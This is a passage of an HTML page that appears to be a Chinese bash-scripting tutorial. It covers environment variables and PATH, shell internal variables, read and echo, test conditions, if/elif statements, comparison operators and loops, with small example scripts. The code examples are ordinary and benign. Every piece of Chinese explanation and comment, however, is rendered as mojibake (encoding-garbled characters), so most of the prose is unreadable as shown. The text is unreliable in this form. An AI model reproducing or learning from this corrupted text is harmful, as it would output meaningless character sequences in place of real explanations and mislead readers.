class="line">PATHçš„å˜é‡å†…çš„ç›®å½•æ¥æŸ¥è¯¢ï¼Œæ‰€ä»¥ï¼Œç›®å½•çš„é¡ºåºä¹Ÿå¾ˆé‡è¦ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ç¯å¢ƒå˜é‡å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è®¾ç½®ï¼Œä½†ç”¨æˆ·æ³¨é”€æ—¶è¿™äº›å€¼å°†ä¸¢å¤±</span><br><span class="line">   ç¯å¢ƒå˜é‡å‡ä¸ºå¤§å†™</span><br><span class="line">   å¿…é¡»ç”¨<span class="built_in">export</span>å‘½ä»¤å¯¼å‡º</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">variable-name=value</span><br><span class="line"><span class="built_in">export</span> variable-name(ç¯å¢ƒå˜é‡åå¤§å†™)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºç¯å¢ƒå˜é‡</span></span><br><span class="line">env å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ç¯å¢ƒå˜é‡</span><br><span class="line"><span class="built_in">echo</span> $ç¯å¢ƒå˜é‡å ï¼ˆæ˜¾ç¤ºä¸€ä¸ªå˜é‡ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">unset</span> ç¯å¢ƒå˜é‡å</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹pathç¯å¢ƒå˜é‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹PATHç¯å¢ƒå˜é‡ï¼Œä½¿è„šæœ¬ä¸ç”¨åŠ è·¯å¾„ï¼Œç›´æ¥è¾“å…¥æ–‡ä»¶åå­—å³å¯æ‰§è¡Œã€‚</span><br><span class="line"><span class="comment"># å‘½ä»¤è¡Œä¿®æ”¹ç¯å¢ƒå˜é‡</span></span><br><span class="line">ä»¥ä¸‹åœ¨ç”¨æˆ·userä¸»ç›®å½•ä¸‹æ“ä½œï¼š</span><br><span class="line">mkdir shdir &amp;&amp; cd shdir</span><br><span class="line">vi hello</span><br><span class="line">chmod <span class="number">755</span> hello</span><br><span class="line">cd ï½</span><br><span class="line">export PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/shdir</span><br><span class="line">åœ¨ä»»ä½•ç›®å½•ä¸‹ï¼Œè¾“å…¥helloå³å¯æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</span><br><span class="line">æœ¬æ–¹å¼ä¸‹ç¯å¢ƒå˜é‡å¦‚æœä¿®æ”¹é”™äº†ï¼Œ<span class="keyword">exit</span>é€€å‡ºåé‡æ–°ç™»é™†å³å¯æ¢å¤ç³»ç»Ÿé»˜è®¤çš„å€¼ã€‚</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ç¯å¢ƒå˜é‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„ï¼Œä¿®æ”¹ç¯å¢ƒå˜é‡å‰æœ€å¥½å…ˆå¤‡ä»½ä¸€ä¸‹æ—§çš„ï¼š</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">tem</span>=<span class="variable">$PATH</span></span><br><span class="line">echo <span class="variable">$tem</span> &gt;&gt;pathbake</span><br><span class="line"></span><br><span class="line">éœ€è¦çŸ¥é“ç¯å¢ƒå˜é‡ä¸å“ªäº›é…ç½®æ–‡ä»¶æœ‰å…³ï¼šä¸åŒå‘è¡Œç‰ˆä¼šæœ‰ä¸åŒï¼Œä½†å‘½åè¿˜æ˜¯æœ‰é€šæ€§çš„ï¼š</span><br><span class="line"><span class="builtin-name">find</span> / -name â€œ*profileâ€</span><br><span class="line"><span class="builtin-name">find</span> / -name â€œ<span class="number">*ba</span>shrcâ€</span><br><span class="line">å…¨å±€é…ç½®æ–‡ä»¶/etc<span class="built_in">/profile</span></span><br><span class="line"><span class="built_in"></span>æœ¬åœ°é…ç½®æ–‡ä»¶~/.bashrc</span><br></pre></td></tr></table></figure><h4 id="å†…éƒ¨å˜é‡"><a href="#å†…éƒ¨å˜é‡" class="headerlink" title="å†…éƒ¨å˜é‡"></a>å†…éƒ¨å˜é‡</h4><p>å†…éƒ¨å˜é‡æ˜¯Linuxæ‰€æä¾›çš„ä¸€ç§ç‰¹æ®Šç±»å‹çš„å˜é‡ï¼Œè¿™ç±»å˜é‡åœ¨ç¨‹åºä¸­ç”¨æ¥ä½œå‡ºåˆ¤æ–­ã€‚åœ¨shellç¨‹åºå†…è¿™ç±»å˜é‡çš„å€¼æ˜¯ä¸èƒ½ä¿®æ”¹çš„ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">éƒ¨åˆ†å†…éƒ¨å˜é‡æ˜¯ï¼š</span><br><span class="line"><span class="symbol">$</span># ä¼ é€ç»™shellç¨‹åºçš„ä½ç½®å‚æ•°çš„æ•°é‡</span><br><span class="line"><span class="symbol">$</span>? æœ€åå‘½ä»¤çš„å®Œæˆç æˆ–è€…åœ¨shellç¨‹åºå†…éƒ¨æ‰§è¡Œçš„shellç¨‹åºï¼ˆè¿”å›å€¼ï¼‰</span><br><span class="line"><span class="meta"><span class="meta-keyword">$0</span> shellç¨‹åºçš„åç§°</span></span><br><span class="line"><span class="symbol">$</span>* è°ƒç”¨shellç¨‹åºæ—¶æ‰€ä¼ é€çš„å…¨éƒ¨å‚æ•°çš„å•å­—ç¬¦ä¸²ï¼Œ<span class="string">&quot;å‚æ•°1&quot;</span>, <span class="string">&quot;å‚æ•°2&quot;</span>â€¦å½¢å¼ä¿å­˜çš„å‚æ•°</span><br><span class="line"><span class="symbol">$</span>@ <span class="string">&quot;å‚æ•°1&quot;</span>, <span class="string">&quot;å‚æ•°2&quot;</span>â€¦å½¢å¼ä¿å­˜çš„å‚æ•°</span><br><span class="line"><span class="meta"><span class="meta-keyword">$n</span> ç¬¬nä¸ªå‚æ•°</span></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span> æœ¬ç¨‹åºçš„PID</span><br><span class="line"><span class="symbol">$</span>! ä¸Šä¸€ä¸ªå‘½ä»¤çš„PID</span><br></pre></td></tr></table></figure><h3 id="è¾“å…¥ä¸è¾“å‡º"><a href="#è¾“å…¥ä¸è¾“å‡º" class="headerlink" title="è¾“å…¥ä¸è¾“å‡º"></a>è¾“å…¥ä¸è¾“å‡º</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># read ä»é”®ç›˜ä¸Šè¯»å–å˜é‡çš„å€¼</span><br><span class="line">read  [é€‰é¡¹]  å˜é‡ååˆ—è¡¨</span><br><span class="line">    å¸¸ç”¨é€‰é¡¹</span><br><span class="line">    -<span class="ruby">a ANAME   å°†è¾“å…¥è¯»å…¥ANAMEçš„æ•°ç»„</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">n NCHARS  è¯»å…¥Nä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">p PROMPT  æ˜¾ç¤ºä¸€ä¸ªæç¤º</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">r         å–æ¶ˆè½¬ç§»</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">s         å®‰é™æ¨¡å¼ï¼Œè¾“å…¥çš„å­—ç¬¦å°†ä¸ä¼šæç¤º</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">t TIMEOUT è¶…è¿‡æŒ‡å®šæ—¶é—´ï¼Œreadè‡ªåŠ¨åœæ­¢</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"># echo æ˜¾ç¤ºå­—ç¬¦ä¸²æˆ–å˜é‡çš„å€¼</span><br><span class="line">echo  [é€‰é¡¹]  å­—ç¬¦ä¸²</span><br><span class="line">    å¸¸ç”¨é€‰é¡¹</span><br><span class="line">    -<span class="ruby">n  ä¸åœ¨æœ€åè‡ªåŠ¨æ¢è¡Œ</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">e  å¯ç”¨åæ–œçº¿æ§åˆ¶å­—ç¬¦çš„è½¬æ¢</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">E  ä¸å¤„ç†è½¬ä¹‰å­—ç¬¦ã€‚æ­¤ä¸ºç¼ºçœé€‰é¡¹ï¼›</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># è¾“å…¥ä¸€å¥è¯ï¼Œæ‰“å°è¾“å…¥çš„è¯</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&#x27;please type some words, I will print them: &#x27;</span> words</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$words</span></span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶æµ‹è¯•"><a href="#æ¡ä»¶æµ‹è¯•" class="headerlink" title="æ¡ä»¶æµ‹è¯•"></a>æ¡ä»¶æµ‹è¯•</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># test</span><br><span class="line"><span class="keyword">test </span>æ¡ä»¶è¡¨è¾¾å¼</span><br><span class="line">å¦‚æœæµ‹è¯•æ¡ä»¶ä¸ºçœŸï¼Œtestå‘½ä»¤ä¼šè¿”å›0ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ªé0çš„æ•°å€¼</span><br><span class="line"><span class="keyword">test </span>è¯­å¥ä¸if/thenå’Œcaseè¯­å¥ä¸€èµ·ï¼Œæ„æˆshellç¼–ç¨‹çš„æ§åˆ¶è½¬ç§»ç»“æ„</span><br><span class="line"></span><br><span class="line"># []</span><br><span class="line">[ æ¡ä»¶è¡¨è¾¾å¼ ]</span><br><span class="line">æ–¹æ‹¬å·çš„å†…ä¾§ä¸¤è¾¹å„éœ€ä¸€ä¸ªç©ºæ ¼</span><br><span class="line"></span><br><span class="line">æ¡ä»¶è¡¨è¾¾å¼çš„å€¼ä¸ºçœŸè¿”å›é›¶ï¼Œä¸ºå‡æ—¶è¿”å›éé›¶å€¼</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶çŠ¶æ€åˆ¤æ–­"><a href="#æ–‡ä»¶çŠ¶æ€åˆ¤æ–­" class="headerlink" title="æ–‡ä»¶çŠ¶æ€åˆ¤æ–­"></a>æ–‡ä»¶çŠ¶æ€åˆ¤æ–­</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-d <span class="meta">filename</span>è‹¥æ–‡ä»¶<span class="meta">filename</span>ä¸ºç›®å½•æ–‡ä»¶ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-f <span class="meta">filename</span>æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä¸”ä¸ºæ™®é€šæ–‡ä»¶ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-r <span class="meta">filename</span>è‹¥æ–‡ä»¶<span class="meta">filename</span>å¯è¯»ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-s <span class="meta">filename</span>è‹¥æ–‡ä»¶<span class="meta">filename</span>çš„é•¿åº¦å¤§äº0ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-w <span class="meta">filename</span>è‹¥æ–‡ä»¶<span class="meta">filename</span>å¯å†™ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-<span class="meta">x</span> <span class="meta">filename</span>è‹¥æ–‡ä»¶<span class="meta">filename</span>å¯æ‰§è¡Œï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line">-e <span class="meta">filename</span>æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># è¾“å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="built_in">read</span>  -p <span class="string">&#x27;input file path: &#x27;</span> file</span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;æ–‡ä»¶å­˜åœ¨&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;æ–‡ä»¶ä¸å­˜åœ¨&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h4 id="æ¡ä»¶è¯­å¥"><a href="#æ¡ä»¶è¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥"></a>æ¡ä»¶è¯­å¥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  [ æ¡ä»¶è¡¨è¾¾å¼ ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    å‘½ä»¤åºåˆ—1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    å‘½ä»¤åºåˆ—2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">å½“<span class="string">&quot;æ¡ä»¶è¡¨è¾¾å¼&quot;</span>çš„æµ‹è¯•å€¼ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—1&quot;</span>ï¼Œå¦åˆ™ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—2&quot;</span>ã€‚å‘½ä»¤åºåˆ—ä¸­çš„å‘½ä»¤</span><br><span class="line">å¯ä»¥æ˜¯ä¸€ä¸ªæˆ–è€…å¤šä¸ªã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ æ¡ä»¶è¡¨è¾¾å¼ ]; <span class="keyword">then</span></span><br><span class="line">    å‘½ä»¤åºåˆ—</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">å½“<span class="string">&quot;æ¡ä»¶è¡¨è¾¾å¼&quot;</span>çš„æµ‹è¯•å€¼ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—&quot;</span>,å¦åˆ™ï¼Œæ‰§è¡Œæ¡ä»¶è¯­å¥åé¢çš„å‘½ä»¤ã€‚æ¡ä»¶è¡¨è¾¾</span><br><span class="line">å¼ä¸<span class="keyword">then</span>ä¹‹é—´çš„åˆ†å·<span class="string">&quot;;&quot;</span>èµ·å‘½ä»¤åˆ†éš”ç¬¦çš„ä½œç”¨ã€‚</span><br><span class="line"></span><br><span class="line">è¯­æ³•å½¢å¼ä¸‰</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> æ¡ä»¶è¡¨è¾¾å¼1</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    å‘½ä»¤åºåˆ—1</span><br><span class="line"><span class="keyword">elif</span> [ æ¡ä»¶è¡¨è¾¾å¼2 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    å‘½ä»¤åºåˆ—2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    å‘½ä»¤åºåˆ—3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">è¿™æ˜¯åŒ…å«äºŒå±‚åµŒå¥—çš„æ¡ä»¶è¯­å¥ï¼Œå½“<span class="string">&quot;æ¡ä»¶è¡¨è¾¾å¼1&quot;</span>ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—1&quot;</span>,å¦åˆ™ï¼Œåœ¨<span class="string">&quot;æ¡ä»¶è¡¨</span></span><br><span class="line"><span class="string">è¾¾å¼2&quot;</span>ä¸ºçœŸçš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—2&quot;</span>ï¼Œå¦åˆ™ï¼Œæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åºåˆ—3&quot;</span>,<span class="string">&quot;å‘½ä»¤åºåˆ—3&quot;</span>å±äºç¬¬2ä¸ªæ¡</span><br><span class="line">ä»¶è¯­å¥çš„ä¸€éƒ¨åˆ†ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># åˆ¤æ–­è¾“å…¥çš„è·¯å¾„æ˜¯æ–‡ä»¶è¿˜æ˜¯ç›®å½•</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&#x27;please input the file path: &#x27;</span> file</span><br><span class="line"><span class="keyword">if</span> [ -d <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;this is a directory&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;this is a file&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;wrong file type, or the file do not exist&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h4 id="æ•°å­—æ“ä½œç¬¦"><a href="#æ•°å­—æ“ä½œç¬¦" class="headerlink" title="æ•°å­—æ“ä½œç¬¦"></a>æ•°å­—æ“ä½œç¬¦</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">n1</span> â€“eq n<span class="number">2</span>åˆ¤æ–­æ•°å­—n<span class="number">1</span>ä¸n<span class="number">2</span>æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> â€“ne n<span class="number">2</span>åˆ¤æ–­æ•°å­—n<span class="number">1</span>ä¸n<span class="number">2</span>æ˜¯å¦ä¸ç­‰ï¼Œè‹¥ä¸ç­‰ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> â€“lt n<span class="number">2</span>åˆ¤æ–­æ•°å­—n<span class="number">1</span>æ˜¯å¦å°äºn<span class="number">2</span>ï¼Œè‹¥æ˜¯ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> â€“gt n<span class="number">2</span>åˆ¤æ–­æ•°å­—n<span class="number">1</span>æ˜¯å¦å¤§äºn<span class="number">2</span>ï¼Œè‹¥æ˜¯ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> â€“le n<span class="number">2</span>åˆ¤æ–­æ•°å­—n<span class="number">1</span>æ˜¯å¦å°äºæˆ–ç­‰äºn<span class="number">2</span>ï¼Œè‹¥æ˜¯ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> â€“ge n<span class="number">2</span> åˆ¤æ–­æ•°å­—n<span class="number">1</span>æ˜¯å¦å¤§äºæˆ–ç­‰äºn<span class="number">2</span>ï¼Œè‹¥æ˜¯ï¼Œè¿”å›<span class="number">0</span>ï¼Œå¦åˆ™ï¼Œè¿”å›<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²æ“ä½œç¬¦"><a href="#å­—ç¬¦ä¸²æ“ä½œç¬¦" class="headerlink" title="å­—ç¬¦ä¸²æ“ä½œç¬¦"></a>å­—ç¬¦ä¸²æ“ä½œç¬¦</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> è‹¥å­—ç¬¦ä¸²<span class="built_in">string</span>éç©ºï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-n <span class="built_in">string</span> è‹¥å­—ç¬¦ä¸²<span class="built_in">string</span>é•¿åº¦å¤§äº<span class="number">0</span>ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-z <span class="built_in">string</span> è‹¥å­—ç¬¦ä¸²<span class="built_in">string</span>é•¿åº¦ä¸º<span class="number">0</span>ï¼Œåˆ™ä¸ºè¿”å›çœŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>1 = <span class="built_in">string</span>2 è‹¥å­—ç¬¦ä¸²<span class="built_in">string</span>1å’Œ<span class="built_in">string</span>2ç›¸ç­‰ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>1 != <span class="built_in">string</span>2 è‹¥å­—ç¬¦ä¸²<span class="built_in">string</span>1å’Œ <span class="built_in">string</span>2ä¸ç­‰ï¼Œåˆ™è¿”å›çœŸ</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="é€»è¾‘æ“ä½œç¬¦"><a href="#é€»è¾‘æ“ä½œç¬¦" class="headerlink" title="é€»è¾‘æ“ä½œç¬¦"></a>é€»è¾‘æ“ä½œç¬¦</h4><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">e1</span> <span class="comment">â€“a</span> <span class="comment">e2é€»è¾‘è¡¨è¾¾å¼e1å’Œe2åŒæ—¶ä¸ºçœŸæ—¶ï¼Œè¿”å›0ï¼Œå¦åˆ™ï¼Œè¿”å›1</span></span><br><span class="line"><span class="comment">e1</span> <span class="comment">â€“o</span> <span class="comment">e2é€»è¾‘è¡¨è¾¾å¼e1å’Œe2æœ‰ä¸€ä¸ªä¸ºçœŸæ—¶ï¼Œè¿”å›0ï¼Œå¦åˆ™ï¼Œè¿”å›1</span></span><br><span class="line"><span class="comment">!</span> <span class="comment">e1</span>    <span class="comment">è‹¥é€»è¾‘è¡¨è¾¾å¼e1ä¸ä¸ºçœŸæ—¶ï¼Œè¿”å›0ï¼Œ</span><span class="string">,</span><span class="comment">å¦åˆ™ï¼Œè¿”å›1</span></span><br></pre></td></tr></table></figure><h3 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> å˜é‡å <span class="keyword">in</span> å‚æ•°åˆ—è¡¨</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    å‘½ä»¤åˆ—è¡¨</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">å°†<span class="string">&quot;å‚æ•°åˆ—è¡¨&quot;</span>ä¸­çš„å…ƒç´ ä¾æ¬¡èµ‹ç»™<span class="string">&quot;å˜é‡å&quot;</span>ï¼Œåœ¨æ¯æ¬¡èµ‹å€¼åæ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åˆ—è¡¨&quot;</span>ï¼Œ<span class="string">&quot;å‚æ•°åˆ—è¡¨&quot;</span>è¡¨ç¤º<span class="string">&quot;å˜</span></span><br><span class="line"><span class="string">é‡å&quot;</span>çš„å–å€¼èŒƒå›´</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((åˆå§‹åŒ–å˜é‡å€¼ï¼›ç»“æŸå¾ªç¯æ¡ä»¶ï¼›è¿ç®—))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    å‘½ä»¤åºåˆ—</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ æ¡ä»¶è¡¨è¾¾å¼ ]</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    å‘½ä»¤åˆ—è¡¨</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">å¾ªç¯æ‰§è¡Œ<span class="string">&quot;å‘½ä»¤åˆ—è¡¨&quot;</span>ä¸­çš„å‘½ä»¤ï¼Œç›´è‡³<span class="string">&quot;æ¡ä»¶è¡¨è¾¾å¼&quot;</span>çš„å€¼ä¸ºå‡ã€‚</span><br><span class="line"></span><br><span class="line">Until [ æ¡ä»¶ ]</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    å‘½ä»¤åºåˆ—</span><br><span class="line">Done</span><br><span class="line">ç›´åˆ°æ¡ä»¶æ»¡è¶³æ—¶å¾ªç¯ç»“æŸ</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure 